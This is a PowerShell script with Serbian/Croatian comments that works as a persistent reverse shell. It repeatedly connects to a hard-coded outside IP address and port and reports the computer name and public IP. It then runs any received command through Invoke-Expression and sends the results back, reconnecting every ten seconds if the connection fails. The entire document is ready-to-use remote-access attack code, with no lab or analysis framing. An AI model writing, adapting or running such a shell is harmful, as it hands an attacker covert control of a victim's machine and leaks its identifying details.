$address = '167.99.247.179'
$port = 54984

while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($address, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # 1. ŠALJEMO IME RAČUNARA
        $writer.WriteLine($env:COMPUTERNAME)

        # 2. ŠALJEMO PUBLIC IP (DODATO)
        try {
            $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
            $writer.WriteLine($publicIP)
        } catch {
            $writer.WriteLine("Skriven/VPN")
        }

        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            # Čistimo komandu od nevidljivih karaktera
            $raw_data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
            $data = $raw_data.Trim("`r","`n"," ")
            
            if ([string]::IsNullOrWhiteSpace($data)) { continue }

            $sendback = ""
            try {
                # LOGIKA ZA CD (DODATO - bez ovoga cd ne radi)
                if ($data -match "^cd\s*(.*)") {
                    $targetPath = $matches[1].Replace('"', '').Trim()
                    if ($targetPath -ne "" -and $targetPath -ne ".") {
                        Set-Location -LiteralPath $targetPath -ErrorAction Stop
                        $sendback = "Lokacija promenjena.`n"
                    }
                } 
                else {
                    # Izvršavanje ostalih komandi
                    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
                }
                
                if ($null -eq $sendback -or $sendback -eq "") { $sendback = " " }
            } catch {
                $sendback = "Greska: " + $_.Exception.Message + "`n"
            }
            
            # Sklapanje odgovora sa promptom (Novi Red + Rezultat + Putanja)
            $currentPath = (Get-Location).Path
            $sendback2 = "`n" + $sendback + "`nPS " + $currentPath + "> "
            
            $x = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($x, 0, $x.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        # Ako pukne veza, čeka 10 sekundi pa pokušava ponovo
        Start-Sleep -Seconds 10
    }
}
